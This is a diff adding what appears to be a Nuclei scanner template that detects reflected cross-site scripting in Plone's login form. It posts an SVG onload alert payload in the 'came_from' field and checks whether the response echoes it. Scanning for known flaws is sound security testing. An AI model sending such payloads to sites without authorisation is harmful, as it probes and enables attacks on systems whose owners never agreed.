@@ -1,0 +1,33 @@
+id: plone-xss
+
+info:
+  name: Plone XSS
+  author: pikpikcu
+  severity: medium
+  reference: https://www.fortinet.com/blog/threat-research/multiple-plone-cross-site-scripting-vulnerabilities
+  tags: plone,xss
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/Plone/login_form"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "came_from=<html><svg onload=alert(/XSS/)></html>&form.submitted=1&js_enabled=0&cookies_enabled=&login_name=&pwd_empty=0&__ac_name=test&__ac_password=test&submit=Log+in"
+
+    matchers-condition: and
+    matchers:
+
+      - type: word
+        words:
+          - '<svg onload=alert(/XSS/)>'
+        part: body
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - 'Content-Type: text/html'
+        part: header
